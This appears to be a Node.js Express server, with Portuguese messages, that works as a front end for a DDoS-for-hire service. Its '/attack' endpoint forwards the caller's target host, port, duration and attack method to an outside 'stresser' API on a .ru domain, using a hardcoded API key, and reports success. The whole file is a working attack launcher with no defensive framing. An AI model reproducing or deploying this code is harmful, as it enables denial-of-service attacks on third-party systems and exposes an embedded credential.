const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors());

app.get('/attack', async (req, res) => {
    try {
        const { host, port, time, method } = req.query;
        const response = await axios.get(`https://api.vacstresser.ru/api?key=01fc4401-db22-4af5-a872-fbcc95ca2d8d&host=${host}&port=${port}&time=${time}&method=${method}`);
        res.json({ status: 'Sucesso', message: 'Ataque realizado com sucesso.' });
    } catch (error) {
        console.error('Erro:', error.message);
        res.status(500).json({ status: 'Erro', message: 'Falha ao realizar o ataque.' });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor está rodando em http://localhost:${PORT}`);
});
